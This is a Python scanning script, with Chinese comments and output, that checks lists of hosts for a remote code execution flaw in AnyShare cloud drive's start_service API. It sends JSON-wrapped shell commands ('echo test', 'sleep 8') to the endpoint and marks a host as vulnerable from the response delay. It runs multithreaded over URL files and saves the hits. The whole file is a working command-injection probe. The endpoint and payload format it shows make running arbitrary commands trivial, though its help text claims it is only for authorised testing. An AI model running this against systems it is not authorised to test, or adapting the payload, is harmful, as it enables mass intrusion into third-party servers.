import requests
import sys
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

def check_vulnerability(url, timeout=15):
    """
    检测单个目标是否存在漏洞
    使用sleep延时方式
    """
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    url = url.rstrip('/')
    
    target = f"{url}/api/ServiceAgent/start_service"
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    
    # 基线请求 - 执行快速命令
    baseline_payload = json.dumps(["echo test"])
    
    # 检测请求 - sleep 8秒
    sleep_payload = json.dumps(["sleep 8"])
    
    try:
        # 基线请求
        start = time.time()
        resp1 = requests.post(target, data=baseline_payload, headers=headers, timeout=5, verify=False)
        baseline_time = time.time() - start
        
        # Sleep请求
        start = time.time()
        resp2 = requests.post(target, data=sleep_payload, headers=headers, timeout=timeout+5, verify=False)
        sleep_time = time.time() - start
        
        # 如果sleep比基线慢5秒以上，可能存在漏洞
        is_vulnerable = (sleep_time - baseline_time) > 5
        
        return {
            'url': url,
            'baseline': round(baseline_time, 2),
            'sleep_time': round(sleep_time, 2),
            'diff': round(sleep_time - baseline_time, 2),
            'vulnerable': is_vulnerable,
            'status_code': resp2.status_code,
            'error': None
        }
        
    except requests.exceptions.Timeout:
        # 如果超时，也可能是漏洞（命令执行导致响应慢）
        return {
            'url': url,
            'vulnerable': True,
            'error': 'Timeout (可能因为sleep命令执行)',
            'status_code': None
        }
    except requests.exceptions.ConnectionError:
        return {
            'url': url,
            'vulnerable': False,
            'error': 'Connection Error',
            'status_code': None
        }
    except Exception as e:
        return {
            'url': url,
            'vulnerable': False,
            'error': str(e),
            'status_code': None
        }

def load_urls_from_file(filepath):
    """从文件中加载URL列表"""
    urls = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    urls.append(line)
    except FileNotFoundError:
        print(f"[!] 文件 {filepath} 不存在")
        sys.exit(1)
    return urls

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='爱数AnyShare云盘远程代码执行漏洞检测 (仅用于授权测试)')
    parser.add_argument('-f', '--file', help='包含目标URL列表的文件路径')
    parser.add_argument('-u', '--url', help='单个目标URL')
    parser.add_argument('-t', '--threads', type=int, default=5, help='线程数 (默认: 5)')
    parser.add_argument('--timeout', type=int, default=15, help='请求超时时间 (默认: 15秒)')
    parser.add_argument('-o', '--output', help='输出结果到文件')
    
    # 如果没有任何参数，显示帮助
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    # 获取目标列表
    targets = []
    if args.file:
        targets = load_urls_from_file(args.file)
    elif args.url:
        targets = [args.url]
    else:
        print("请指定 -f 或 -u")
        print("示例: python3 check_anyshare.py -f urls.txt")
        print("示例: python3 check_anyshare.py -u http://192.168.1.1")
        sys.exit(1)
    
    print("="*60)
    print("[*] 爱数AnyShare云盘 start_service 漏洞检测")
    print(f"[*] 目标数量: {len(targets)}")
    print(f"[*] 线程数: {args.threads}")
    print(f"[*] 超时时间: {args.timeout}s")
    print("="*60)
    
    results = []
    vulnerable_list = []
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {
            executor.submit(check_vulnerability, url, args.timeout): url 
            for url in targets
        }
        
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                results.append(result)
                
                if result.get('error'):
                    if 'Timeout' in str(result.get('error', '')):
                        print(f"[+] {url} - 可能漏洞! (请求超时，疑似sleep执行)")
                        vulnerable_list.append(url)
                    else:
                        print(f"[-] {url} - 错误: {result['error']}")
                elif result.get('vulnerable'):
                    print(f"[+] {url} - 存在漏洞! (响应延迟: {result['diff']}s, 状态码: {result['status_code']})")
                    vulnerable_list.append(url)
                else:
                    print(f"[-] {url} - 安全 (延迟: {result.get('diff', 0)}s, 状态码: {result.get('status_code')})")
                    
            except Exception as e:
                print(f"[!] {url} - 异常: {e}")
    
    # 统计结果
    print("\n" + "="*60)
    print("[*] 检测完成!")
    print(f"[*] 共检测: {len(targets)} 个目标")
    print(f"[+] 发现漏洞: {len(vulnerable_list)} 个")
    
    if vulnerable_list:
        print("\n[+] 可能存在漏洞的目标:")
        for v in vulnerable_list:
            print(f"  - {v}")
    
    # 保存结果
    if args.output and vulnerable_list:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write("可能存在漏洞的目标:\n")
            f.write("="*40 + "\n")
            for v in vulnerable_list:
                f.write(f"{v}\n")
        print(f"\n[*] 结果已保存到: {args.output}")
    
    if not vulnerable_list:
        print("\n[-] 未发现漏洞目标")

if __name__ == "__main__":
    main()